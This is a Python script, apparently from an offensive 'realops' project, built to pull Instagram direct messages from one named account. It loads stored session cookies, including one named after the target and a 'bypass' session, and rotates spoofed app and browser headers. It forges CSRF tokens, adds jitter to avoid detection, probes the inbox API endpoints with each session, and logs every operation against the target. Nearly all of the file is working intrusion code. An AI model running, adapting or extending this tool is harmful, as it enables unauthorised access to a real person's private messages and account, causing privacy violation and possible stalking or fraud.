#!/usr/bin/env python3
"""
🎯 ADVANCED DM EXTRACTION TOOLS 2025
====================================
เครื่องมือขั้นสูงสำหรับการดึง DM โดยใช้:
- Valid sessions ที่มีอยู่ในโปรเจกต์
- Advanced techniques
- Multiple extraction methods
- Bypass techniques
- Real session utilization
"""

import json
import os
import time
import requests
import sqlite3
from datetime import datetime
import random
import base64
import hashlib
import uuid
from pathlib import Path
from target_database_manager import TargetDatabaseManager

class AdvancedDMExtractor:
    """🎯 Advanced DM Extraction with valid sessions and rate limiting protection"""
    
    def __init__(self):
        self.target = "alx.trading"
        self.base_delay = 3  # Base delay between requests (seconds)
        self.max_retry = 5   # Maximum retry attempts for 429 errors
        self.last_request_time = 0  # Track last request time
        self.project_root = "/workspaces/sugarglitch-realops"
        
        # Load all valid sessions
        self.valid_sessions = self.load_all_valid_sessions()
        
        # Advanced headers rotation
        self.header_sets = [
            {
                'User-Agent': 'Instagram 219.0.0.12.117 Android (28/9; 420dpi; 1080x2340; samsung; SM-G975F; beyond2; exynos9820; en_US; 314665256)',
                'X-IG-App-ID': '936619743392459',
                'X-IG-Android-ID': 'android-' + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16],
                'X-IG-Connection-Type': 'WIFI',
                'X-IG-Capabilities': '3brTvwM=',
                'Accept-Language': 'en-US',
                'Accept-Encoding': 'gzip, deflate',
                'Host': 'i.instagram.com',
                'Connection': 'close',
            },
            {
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
                'Accept': '*/*',
                'Accept-Language': 'en-us',
                'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://www.instagram.com/',
                'X-Requested-With': 'XMLHttpRequest',
                'X-CSRFToken': '',
                'X-Instagram-AJAX': '1',
            },
            {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Upgrade-Insecure-Requests': '1',
            }
        ]
        
        # Instagram API endpoints
        self.api_endpoints = {
            'web_inbox': 'https://www.instagram.com/direct/inbox/',
            'api_inbox': 'https://i.instagram.com/api/v1/direct_v2/inbox/',
            'graphql': 'https://www.instagram.com/api/graphql/',
            'web_api': 'https://www.instagram.com/api/v1/',
            'mobile_api': 'https://i.instagram.com/api/v1/',
        }
        
        # Database
        self.db_manager = TargetDatabaseManager(f"{self.project_root}/integrated_targets_2025.db")
        
        # Output
        self.output_dir = f"{self.project_root}/advanced_extraction/alx_trading"
        os.makedirs(self.output_dir, exist_ok=True)
        
        print(f"🎯 Advanced DM Extractor initialized")
        print(f"   Target: {self.target}")
        print(f"   Valid sessions loaded: {len(self.valid_sessions)}")
    
    def load_all_valid_sessions(self):
        """Load all valid sessions from project"""
        sessions = []
        
        # Session directories to check
        session_paths = [
            f"{self.project_root}/sessions/",
            f"{self.project_root}/sessions_regenerated/",
            f"{self.project_root}/config/sessions/",
        ]
        
        session_files = []
        for path in session_paths:
            if os.path.exists(path):
                for file in os.listdir(path):
                    if file.endswith('.json') or 'session' in file:
                        session_files.append(os.path.join(path, file))
        
        # Also check direct session files
        direct_files = [
            f"{self.project_root}/sessions/session-alx.trading",
            f"{self.project_root}/sessions_regenerated/quick_bypass_session.json",
        ]
        
        all_files = session_files + direct_files
        
        for file_path in all_files:
            try:
                if os.path.exists(file_path):
                    with open(file_path, 'r') as f:
                        data = json.load(f)
                        
                        session_data = {
                            'file': os.path.basename(file_path),
                            'path': file_path,
                            'data': data,
                            'cookies': data.get('cookies', {}),
                            'valid': bool(data.get('cookies', {})),
                            'loaded_at': datetime.now().isoformat()
                        }
                        
                        sessions.append(session_data)
                        print(f"✅ Loaded session: {os.path.basename(file_path)}")
                        
            except Exception as e:
                print(f"⚠️ Could not load {file_path}: {e}")
        
        return sessions
    
    def create_advanced_session(self, session_data, header_set):
        """Create advanced session with valid cookies and headers"""
        session = requests.Session()
        
        # Set headers
        session.headers.update(header_set)
        
        # Set cookies
        cookies = session_data.get('cookies', {})
        for name, value in cookies.items():
            session.cookies.set(name, value, domain='.instagram.com')
        
        # Add additional Instagram-specific cookies if needed
        if 'csrftoken' not in cookies:
            session.cookies.set('csrftoken', self.generate_csrf_token(), domain='.instagram.com')
        
        return session
    
    def generate_csrf_token(self):
        """Generate valid CSRF token"""
        return base64.b64encode(os.urandom(32)).decode('utf-8')[:32]
    
    def advanced_session_test(self, session_info, header_set):
        """🔍 Advanced session testing with smart rate limiting"""
        print(f"🔍 Testing session: {session_info['file']}")
        
        # Convert session to headers format
        session = self.create_advanced_session(session_info, header_set)
        cookie_header = '; '.join([f"{k}={v}" for k, v in session.cookies.items()])
        headers = session.headers.copy()
        if cookie_header:
            headers['Cookie'] = cookie_header
        
        test_results = {
            'session_file': session_info['file'],
            'tests': {}
        }
        
        # Test 1: Basic Instagram access
        try:
            print(f"   📡 Testing basic access...")
            response = self.smart_request('https://www.instagram.com/', headers, session_name=session_info['file'])
            if response:
                test_results['tests']['basic_access'] = {
                    'status': response.status_code,
                    'success': response.status_code == 200,
                    'response_size': len(response.content)
                }
                print(f"   📡 Basic access: {response.status_code}")
            else:
                test_results['tests']['basic_access'] = {'error': 'No response received'}
        except Exception as e:
            test_results['tests']['basic_access'] = {'error': str(e)}
            print(f"   ❌ Basic access failed: {e}")
        
        # Test 2: Profile access  
        try:
            print(f"   👤 Testing profile access...")
            response = self.smart_request(f'https://www.instagram.com/{self.target}/', headers, session_name=session_info['file'])
            if response:
                test_results['tests']['profile_access'] = {
                    'status': response.status_code,
                    'success': response.status_code == 200,
                    'profile_found': 'Sorry, this page' not in response.text,
                    'private': 'This account is private' in response.text
                }
                print(f"   👤 Profile access: {response.status_code}")
            else:
                test_results['tests']['profile_access'] = {'error': 'No response received'}
        except Exception as e:
            test_results['tests']['profile_access'] = {'error': str(e)}
            print(f"   ❌ Profile access failed: {e}")
        
        # Test 3: Direct access
        try:
            print(f"   📨 Testing direct access...")
            response = self.smart_request('https://www.instagram.com/direct/inbox/', headers, session_name=session_info['file'])
            if response:
                test_results['tests']['direct_access'] = {
                    'status': response.status_code,
                    'success': response.status_code == 200,
                    'redirect': 'login' in response.url
                }
                print(f"   📨 Direct access: {response.status_code}")
            else:
                test_results['tests']['direct_access'] = {'error': 'No response received'}
        except Exception as e:
            test_results['tests']['direct_access'] = {'error': str(e)}
            print(f"   ❌ Direct access failed: {e}")
        
        return test_results
    
    def advanced_profile_extraction(self, session_info, header_set):
        """Advanced profile data extraction with smart rate limiting"""
        print(f"🔍 Advanced profile extraction using: {session_info['file']}")
        
        # Convert session to headers format
        session = self.create_advanced_session(session_info, header_set)
        cookie_header = '; '.join([f"{k}={v}" for k, v in session.cookies.items()])
        headers = session.headers.copy()
        if cookie_header:
            headers['Cookie'] = cookie_header
        
        profile_data = {
            'session_used': session_info['file'],
            'extraction_timestamp': datetime.now().isoformat(),
            'data': {}
        }
        
        try:
            # Get profile page with smart rate limiting
            response = self.smart_request(f'https://www.instagram.com/{self.target}/', headers, session_name=session_info['file'])
            
            if response and response.status_code == 200:
                content = response.text
                
                # Extract various data points
                profile_data['data'] = {
                    'page_accessible': True,
                    'response_size': len(content),
                    'contains_profile_data': 'profilePage_' in content,
                    'contains_user_info': '"username":"' in content,
                    'private_account': 'This account is private' in content,
                    'user_found': 'Sorry, this page' not in content,
                    'has_posts': '"edge_owner_to_timeline_media"' in content,
                    'has_followers': '"edge_followed_by"' in content,
                }
                
                # Try to extract user ID if available
                if '"id":"' in content:
                    try:
                        start = content.find('"id":"') + 6
                        end = content.find('"', start)
                        user_id = content[start:end]
                        profile_data['data']['user_id'] = user_id
                        print(f"   ✅ Found user ID: {user_id}")
                    except:
                        pass
                
                # Extract follower count if visible
                if '"edge_followed_by":{"count":' in content:
                    try:
                        start = content.find('"edge_followed_by":{"count":') + 28
                        end = content.find('}', start)
                        followers = content[start:end]
                        profile_data['data']['followers'] = int(followers)
                        print(f"   👥 Followers: {followers}")
                    except:
                        pass
                
                print(f"   ✅ Profile data extracted successfully")
                
            else:
                profile_data['data'] = {
                    'page_accessible': False,
                    'error_code': response.status_code if response else 'No response'
                }
                print(f"   ❌ Profile access failed: {response.status_code if response else 'No response'}")
                
        except Exception as e:
            profile_data['data'] = {'error': str(e)}
            print(f"   ❌ Profile extraction error: {e}")
        
        return profile_data
    
    def advanced_dm_endpoint_testing(self, session, session_info):
        """Test advanced DM endpoints"""
        print(f"🔍 Testing DM endpoints with: {session_info['file']}")
        
        endpoint_results = []
        
        for endpoint_name, url in self.api_endpoints.items():
            print(f"   🔗 Testing {endpoint_name}")
            
            try:
                # Add random delay
                time.sleep(random.uniform(1, 3))
                
                response = session.get(url, timeout=10)
                
                result = {
                    'endpoint': endpoint_name,
                    'url': url,
                    'status_code': response.status_code,
                    'response_size': len(response.content),
                    'timestamp': datetime.now().isoformat(),
                    'success': response.status_code in [200, 302]
                }
                
                # Analyze response content
                if response.status_code == 200:
                    content = response.text.lower()
                    result['analysis'] = {
                        'contains_messages': 'message' in content or 'thread' in content,
                        'contains_inbox': 'inbox' in content,
                        'contains_direct': 'direct' in content,
                        'json_response': response.headers.get('content-type', '').startswith('application/json')
                    }
                    
                    if result['analysis']['json_response']:
                        try:
                            json_data = response.json()
                            result['json_data_keys'] = list(json_data.keys()) if isinstance(json_data, dict) else []
                        except:
                            pass
                
                endpoint_results.append(result)
                print(f"      📊 {response.status_code} - {len(response.content)} bytes")
                
            except Exception as e:
                result = {
                    'endpoint': endpoint_name,
                    'url': url,
                    'error': str(e),
                    'timestamp': datetime.now().isoformat()
                }
                endpoint_results.append(result)
                print(f"      ❌ Error: {e}")
        
        return endpoint_results
    
    def smart_request(self, url, headers, method='GET', data=None, session_name="unknown"):
        """🎯 Smart request with rate limiting protection and retry logic"""
        
        # Ensure minimum delay between requests
        elapsed = time.time() - self.last_request_time
        if elapsed < self.base_delay:
            sleep_time = self.base_delay - elapsed
            print(f"   ⏱️ Rate limiting protection: waiting {sleep_time:.1f}s")
            time.sleep(sleep_time)
        
        retry_count = 0
        while retry_count < self.max_retry:
            try:
                # Add random jitter to avoid pattern detection
                jitter = random.uniform(0.5, 2.0)
                if retry_count > 0:
                    print(f"   🔄 Retry attempt {retry_count}/{self.max_retry}")
                    time.sleep(jitter)
                
                self.last_request_time = time.time()
                
                if method.upper() == 'POST':
                    response = requests.post(url, headers=headers, data=data, timeout=30)
                else:
                    response = requests.get(url, headers=headers, timeout=30)
                
                # Handle different response codes
                if response.status_code == 429:
                    print(f"   ⚠️ HTTP 429 - Too Many Requests (Session: {session_name})")
                    
                    # Check for Retry-After header
                    retry_after = response.headers.get('Retry-After')
                    if retry_after:
                        wait_time = int(retry_after)
                        print(f"   ⏰ Server says wait {wait_time}s (Retry-After header)")
                        time.sleep(wait_time)
                    else:
                        # Exponential backoff
                        wait_time = random.uniform(5, 15) * (retry_count + 1)
                        print(f"   ⏰ Exponential backoff: waiting {wait_time:.1f}s")
                        time.sleep(wait_time)
                    
                    retry_count += 1
                    continue
                
                elif response.status_code in [200, 201, 404]:
                    # Success or acceptable response
                    return response
                
                else:
                    print(f"   ⚠️ HTTP {response.status_code} (Session: {session_name})")
                    if retry_count < self.max_retry - 1:
                        wait_time = random.uniform(2, 8)
                        print(f"   ⏰ Retrying after {wait_time:.1f}s...")
                        time.sleep(wait_time)
                        retry_count += 1
                        continue
                    return response
                    
            except requests.RequestException as e:
                print(f"   ❌ Request error: {e}")
                if retry_count < self.max_retry - 1:
                    wait_time = random.uniform(3, 10)
                    print(f"   ⏰ Retrying after {wait_time:.1f}s...")
                    time.sleep(wait_time)
                    retry_count += 1
                    continue
                raise
        
        # If we get here, all retries failed
        print(f"   ❌ All retry attempts failed for {url}")
        return response if 'response' in locals() else None

    def perform_advanced_extraction(self):
        """Perform advanced extraction using all available techniques"""
        print(f"\n🎯 STARTING ADVANCED DM EXTRACTION")
        print(f"===================================")
        print(f"Target: {self.target}")
        print(f"Advanced techniques enabled")
        print(f"Valid sessions: {len(self.valid_sessions)}")
        
        extraction_results = {
            'extraction_info': {
                'target': self.target,
                'timestamp': datetime.now().isoformat(),
                'method': 'advanced_dm_extraction',
                'techniques_used': [
                    'Multiple valid sessions',
                    'Advanced header rotation',
                    'Multiple API endpoints',
                    'Session validation',
                    'Profile extraction',
                    'Endpoint testing'
                ],
                'total_sessions_tested': len(self.valid_sessions)
            },
            'session_tests': [],
            'profile_extractions': [],
            'endpoint_tests': [],
            'successful_extractions': 0,
            'data_found': False
        }
        
        # Test each valid session with different header sets
        for i, session_info in enumerate(self.valid_sessions):
            print(f"\n📋 Testing session {i+1}/{len(self.valid_sessions)}: {session_info['file']}")
            
            for j, headers in enumerate(self.header_sets):
                print(f"   🔄 Header set {j+1}/{len(self.header_sets)}")
                
                try:
                    # Test session validity
                    session_test = self.advanced_session_test(session_info, headers)
                    session_test['header_set'] = j + 1
                    extraction_results['session_tests'].append(session_test)
                    
                    # If session seems valid, proceed with extraction
                    if any(test.get('success') for test in session_test['tests'].values()):
                        print(f"   ✅ Session appears functional, proceeding with extraction")
                        
                        # Extract profile data
                        profile_data = self.advanced_profile_extraction(session_info, headers)
                        profile_data['header_set'] = j + 1
                        extraction_results['profile_extractions'].append(profile_data)
                        
                        # Test DM endpoints  
                        endpoint_results = self.advanced_dm_endpoint_testing(session_info, headers)
                        for result in endpoint_results:
                            result['session_file'] = session_info['file']
                            result['header_set'] = j + 1
                        extraction_results['endpoint_tests'].extend(endpoint_results)
                        
                        # Check if any data was successfully extracted
                        if profile_data['data'].get('page_accessible') or any(r.get('success') for r in endpoint_results):
                            extraction_results['successful_extractions'] += 1
                            extraction_results['data_found'] = True
                    
                    # Delay between attempts for rate limiting protection
                    time.sleep(random.uniform(3, 8))
                    
                except Exception as e:
                    print(f"   ❌ Error with session/headers combination: {e}")
        
        # Save results
        timestamp = int(time.time())
        output_file = f"{self.output_dir}/advanced_extraction_{timestamp}.json"
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(extraction_results, f, indent=2, ensure_ascii=False)
        
        print(f"\n✅ ADVANCED EXTRACTION COMPLETED")
        print(f"📂 Results saved: {output_file}")
        print(f"🎯 Sessions tested: {len(self.valid_sessions)}")
        print(f"📊 Successful extractions: {extraction_results['successful_extractions']}")
        print(f"✅ Data found: {extraction_results['data_found']}")
        
        # Update database
        try:
            operation_id = self.db_manager.log_operation(
                self.target,
                'advanced_dm_extraction',
                json.dumps({
                    'sessions_tested': len(self.valid_sessions),
                    'successful_extractions': extraction_results['successful_extractions'],
                    'data_found': extraction_results['data_found']
                })
            )
            print(f"✅ Database updated - Operation ID: {operation_id}")
        except Exception as e:
            print(f"⚠️ Database update warning: {e}")
        
        return extraction_results

def main():
    """Main execution function"""
    print("🎯 ADVANCED DM EXTRACTION TOOLS 2025")
    print("=====================================")
    print("Using valid sessions and advanced techniques")
    
    extractor = AdvancedDMExtractor()
    results = extractor.perform_advanced_extraction()
    
    print("\n🎯 FINAL SUMMARY")
    print("================")
    print(f"Target: {extractor.target}")
    print(f"Sessions tested: {results['extraction_info']['total_sessions_tested']}")
    print(f"Successful extractions: {results['successful_extractions']}")
    print(f"Data found: {'YES' if results['data_found'] else 'NO'}")

if __name__ == "__main__":
    main()
